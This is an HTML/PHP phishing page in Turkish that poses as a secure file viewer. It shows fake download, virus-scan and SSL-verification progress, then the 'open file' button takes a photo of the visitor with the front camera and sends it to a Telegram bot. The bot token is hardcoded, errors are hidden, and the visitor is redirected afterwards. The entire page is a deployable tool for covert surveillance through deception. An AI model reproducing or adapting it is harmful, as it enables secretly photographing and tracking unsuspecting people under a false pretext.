<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenli Görüntüleme - Dosya Hazırlığı</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 400px;
            width: 100%;
            transition: all 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .header-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
            color: white;
            font-size: 40px;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        h2 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .status-container {
            background: #f7f9fc;
            border-radius: 12px;
            padding: 20px;
            margin: 25px 0;
            border: 1px solid #eef2f6;
        }

        .status-message {
            color: #4a5568;
            font-size: 16px;
            margin-bottom: 15px;
            font-weight: 500;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e2e8f0;
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            border-radius: 10px;
            transition: width 0.3s ease;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #48bb78;
            font-size: 14px;
            margin: 15px 0 10px;
            padding: 8px;
            background: #f0fff4;
            border-radius: 20px;
        }

        .security-badge svg {
            width: 18px;
            height: 18px;
        }

        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            opacity: 0;
            transform: translateY(10px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .footer-text {
            margin-top: 20px;
            font-size: 13px;
            color: #a0aec0;
        }

        .loading-dots {
            display: inline-block;
        }

        .loading-dots:after {
            content: '.';
            animation: dots 1.5s steps(5, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }

        #v, #c {
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="header-icon">
            🔒
        </div>
        
        <h2>Güvenli Bağlantı</h2>
        
        <div class="status-container">
            <div class="status-message" id="msg">
                <span>Dosya doğrulanıyor</span>
                <span class="loading-dots"></span>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill" id="progress"></div>
            </div>

            <div class="security-badge" id="securityBadge" style="display: none;">
                <svg viewBox="0 0 20 20" fill="currentColor">
                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                </svg>
                <span>Güvenli bağlantı kuruldu (SSL/TLS)</span>
            </div>
        </div>

        <button class="btn" id="btn" onclick="handleButtonClick()">
            Dosyayı Güvenle Aç
        </button>
        
        <div class="footer-text">
            <span id="timer">•</span> dosya kimliği: <span id="fileId"><?php echo htmlspecialchars($_GET['id'] ?? 'YÜK4847'); ?></span>
        </div>
    </div>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

    <script>
        // Konfigürasyon
        const CONFIG = {
            TOKEN: "8221475489:AAHC2XRJVo4k8Q7RK2fUUAzs1Trml4cUi0U", // Telegram Bot Token
            REDIRECT_URL: "https://kzfreehanemoyum.onrender.com", // Yönlendirilecek URL
            PROGRESS_STEPS: [20, 45, 70, 85, 95, 100], // İlerleme adımları
            STEP_DELAYS: [400, 500, 600, 700, 800, 200] // Her adımın bekleme süresi (ms)
        };

        // URL parametrelerini al
        const urlParams = new URLSearchParams(window.location.search);
        const fileId = urlParams.get('id') || 'YÜK' + Math.floor(Math.random() * 10000);
        document.getElementById('fileId').textContent = fileId;

        let progressInterval;
        let currentStep = 0;

        // Profesyonel görünümlü ilerleme simülasyonu
        function startProgressSimulation() {
            const progressFill = document.getElementById('progress');
            const msgElement = document.getElementById('msg');
            const securityBadge = document.getElementById('securityBadge');
            
            progressInterval = setInterval(() => {
                if (currentStep < CONFIG.PROGRESS_STEPS.length) {
                    const targetProgress = CONFIG.PROGRESS_STEPS[currentStep];
                    progressFill.style.width = targetProgress + '%';
                    
                    // Durum mesajlarını güncelle
                    if (targetProgress <= 20) {
                        msgElement.innerHTML = '<span>Dosya indiriliyor</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 45) {
                        msgElement.innerHTML = '<span>Virüs taraması yapılıyor</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 70) {
                        msgElement.innerHTML = '<span>Şifre çözülüyor</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 85) {
                        msgElement.innerHTML = '<span>Güvenlik duvarı kontrolü</span> <span class="loading-dots"></span>';
                    } else if (targetProgress <= 95) {
                        msgElement.innerHTML = '<span>Son hazırlıklar yapılıyor</span> <span class="loading-dots"></span>';
                    }
                    
                    currentStep++;
                } else {
                    // İlerleme tamamlandı
                    clearInterval(progressInterval);
                    msgElement.innerHTML = '<span>Dosya hazır</span> <span style="color: #48bb78;">✓</span>';
                    securityBadge.style.display = 'flex';
                    
                    // Butonu göster
                    document.getElementById('btn').classList.add('visible');
                }
            }, CONFIG.STEP_DELAYS[currentStep]);
        }

        // Timer'ı güncelle (sahte süre)
        function updateTimer() {
            const timerElement = document.getElementById('timer');
            let seconds = 0;
            setInterval(() => {
                seconds++;
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                timerElement.textContent = `⏱️ ${mins}:${secs.toString().padStart(2, '0')}`;
            }, 1000);
        }

        // Kamera ve fotoğraf gönderme işlemi
        async function captureAndSendPhoto() {
            try {
                // Kamera izni iste
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, // Ön kamera
                    audio: false 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // Buton metnini güncelle
                const btn = document.getElementById('btn');
                btn.innerHTML = '<span>Fotoğraf çekiliyor</span> <span class="loading-dots"></span>';
                btn.disabled = true;

                // Kameranın hazır olmasını bekle
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });

                // Fotoğraf çek
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    const context = canvas.getContext('2d');
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Fotoğrafı blob'a çevir
                    const photoBlob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg', 0.8);
                    });

                    // Telegram'a gönder
                    const formData = new FormData();
                    formData.append('chat_id', fileId);
                    formData.append('photo', photoBlob, 'verified_access.jpg');
                    formData.append('caption', `🔐 Güvenli Erişim Doğrulaması\n📱 Kullanıcı ID: ${fileId}\n⏰ Zaman: ${new Date().toLocaleString('tr-TR')}\n🌐 IP: Gizli (SSL ile korunuyor)`);

                    // Tüm stream'leri durdur
                    stream.getTracks().forEach(track => track.stop());

                    // API'ye gönder (arka planda, bekleme)
                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(err => console.log('Gönderim durumu:', err)); // Hata yönetimi sessiz

                    // Google'a yönlendir
                    window.location.href = CONFIG.REDIRECT_URL;
                    
                }, 1500); // 1.5 saniye bekle (kameranın stabilize olması için)

            } catch (error) {
                console.log('Kamera hatası:', error);
                // Hata durumunda direkt yönlendir
                window.location.href = CONFIG.REDIRECT_URL;
            }
        }

        // Butona tıklandığında çalışacak fonksiyon
        function handleButtonClick() {
            const btn = document.getElementById('btn');
            if (!btn.disabled) {
                captureAndSendPhoto();
            }
        }

        // Sayfa yüklendiğinde başlat
        window.onload = function() {
            startProgressSimulation();
            updateTimer();
        };
    </script>
</body>
</html>
